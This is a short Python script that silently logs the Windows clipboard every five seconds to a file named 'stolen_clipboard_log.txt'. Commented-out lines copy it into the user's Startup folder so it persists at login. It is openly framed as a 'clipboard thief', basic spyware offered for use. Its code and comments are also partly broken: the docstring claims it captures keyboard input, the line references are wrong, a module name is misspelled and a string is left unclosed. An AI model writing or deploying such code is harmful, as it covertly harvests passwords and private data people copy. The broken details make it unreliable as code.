''' 
clipboard_logger.py
    
  - This script will capture all keyboard input on a windows PC into a text file 
  - Uncomment lines 6 & 7 to have the script run at User Login 
  - This script requires `pip3 install win32clipboard` 
'''

import win32clipboard
from time import sleep
''' 
Run script on boot *windows 

  - Moves the script to the startup directory
'''
# import os
# from shututil import copyfile
# get user name
# user = os.getlogin()
# copyfile("clipboardthief.py, f"C:/Users/{user}/AppData/Roaming/Microsoft/Start Menu/Startup/clipboardthief.py")

while True:
    # open clipboard
    win32clipboard.OpenClipboard()
    # pull clipboard data
    extracted_data = win32clipboard.GetClipboardData()
    # close clipboard
    win32clipboard.CloseClipboard()

    # with file open
    with open("stolen_clipboard_log.txt", "a+") as file:
        #  write data to file
        file.write(extracted_data + "\n")
    # then sleep
    sleep(5)
